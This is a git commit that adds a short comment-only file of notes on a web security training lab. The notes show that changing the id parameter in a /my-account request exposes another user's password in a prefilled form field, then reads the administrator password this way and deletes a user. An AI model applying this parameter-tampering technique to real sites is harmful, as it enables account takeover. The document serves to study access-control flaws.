0503720d2c0c4943f1f64f3738bf050f1db5a1d5
Pranjal <pranjalruhela2811@gmail.com>
2023-07-09 12:55:01 +0530

    hori hidden password prefilled password input field leads to vert privesc

---
+++ BrokenAccessControl/User ID controlled by request parameter with password disclosure/steps.js
@@ -0,0 +1,11 @@
+/*
+1) login as wiener
+    GET /my-account?id=wiener HTTP/2
+    <input required type=password name=password value='peter'/>     //source 
+
+2) change parameters to administrator to get access to admin privs
+    GET /my-account?id=administrator HTTP/2
+    <input required type=password name=password value='3mf7hmghuoc9sn0l4y9d'/>
+
+3) delete the user carlos
+*/
